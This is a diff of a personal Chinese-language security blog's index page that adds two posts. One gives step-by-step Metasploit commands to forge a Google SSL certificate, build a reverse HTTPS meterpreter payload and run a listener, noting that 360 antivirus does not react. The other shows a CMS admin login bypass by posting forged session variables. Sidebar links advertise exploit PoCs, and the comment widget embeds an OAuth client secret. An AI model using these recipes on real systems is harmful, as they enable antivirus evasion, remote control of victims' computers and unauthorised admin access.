@@ -66,6 +66,126 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-httpsms" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/17/httpsms/" class="article-date">
+  <time datetime="2020-11-17T10:00:38.000Z" itemprop="datePublished">2020-11-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/17/httpsms/">httpsms</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#https证书绕过杀软<br><strong>msf生成证书（要能连上google，用俺vps来搞）</strong><br>use auxiliary/gather/impersonate_ssl</p>
+<p>set RHOST <a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a></p>
+<p>run<br><img src="https://s1.ax1x.com/2017/10/17/JOAmV.png" alt="enter image description here"><br>生成msf攻击载荷：msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.226.136 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/root/<a target="_blank" rel="noopener" href="http://www.google.com.pem/">www.google.com.pem</a> StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f py -o pentestlab.py<br>然后msf监听：</p>
+<p>use exploit/multi/handler</p>
+<p>set payload windows/meterpreter/reverse_winhttps</p>
+<p>set LHOST 192.168.226.136</p>
+<p>set LPORT 443</p>
+<p>set HandlerSSLCert /root/<a target="_blank" rel="noopener" href="http://www.google.com.pem/">www.google.com.pem</a> (设置证书)</p>
+<p>set StagerVerifySSLCert true</p>
+<p>exploit -j</p>
+<p>然后在win7上运行这个pentestlab.py<br><img src="https://s1.ax1x.com/2017/10/17/JOEwT.png" alt="enter image description here"></p>
+<p>360杀毒，安全卫士无反应。</p>
+<p>全自动工具：<a target="_blank" rel="noopener" href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://pentestlab.blog/category/defense-evasion/">https://pentestlab.blog/category/defense-evasion/</a></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2020/11/17/httpsms/" data-id="ckmogaiiu0007aacp1gosfpm0" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-cms漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/17/cms%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2020-11-17T09:36:28.000Z" itemprop="datePublished">2020-11-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/17/cms%E6%BC%8F%E6%B4%9E/">cms</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#cms后台登录绕过<br>@miko</p>
+<p>1.随便打开一个index.php，然后发送post请求，创建seions.<br><img src="https://raw.githubusercontent.com/renzhonglin/image/master/3.png" alt="enter image description here"><br>POST:_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999此时就成功地创建了SESION变量.<br>2.创建完成后，登录后台.<br><img src="https://raw.githubusercontent.com/renzhonglin/image/master/1.png" alt="enter image description here"><br>3.成功！<br><img src="https://raw.githubusercontent.com/renzhonglin/image/master/2.png" alt="enter image description here"></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2020/11/17/cms%E6%BC%8F%E6%B4%9E/" data-id="ckmogaiit0006aacp0zk5bsz6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-about" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/17/about/" class="article-date">
@@ -156,6 +276,14 @@ gitalk.render('gitalk-container')
       <ul>
         
           <li>
+            <a href="/2021/09/17/MFC%E7%A4%BE%E5%B7%A5%E5%88%A9%E5%99%A8/">MFC社工利器</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/17/esp8266+blinker%E7%9A%84app+%E5%B0%8F%E7%88%B1%E5%90%8C%E5%AD%A6%E6%8E%A7%E5%88%B64%E5%88%B08%E4%B8%AA%E8%AE%BE%E5%A4%87%E6%BA%90%E7%A0%81/">esp8266+blinker+小爱同学控制4到8个设备源码</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/17/%E5%BE%AE%E4%BF%A13-2-11-151Google%E5%86%85%E6%A0%B8poc%E5%88%A9%E7%94%A8%E4%B8%8A%E7%BA%BF/">微信3.2.11.151Google内核poc利用上线</a>
           </li>
         
@@ -165,14 +293,6 @@ gitalk.render('gitalk-container')
         
           <li>
             <a href="/2021/04/19/google-0day/">google-0day</a>
-          </li>
-        
-          <li>
-            <a href="/2021/04/04/%E9%87%91%E5%92%8C%E5%8D%8F%E5%90%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/">金和协同水平越权漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2021/04/04/%E6%99%BA%E6%85%A7%E6%95%99%E8%82%B2%E8%B6%8A%E6%9D%83/">智慧教育越权</a>
           </li>
         
       </ul>
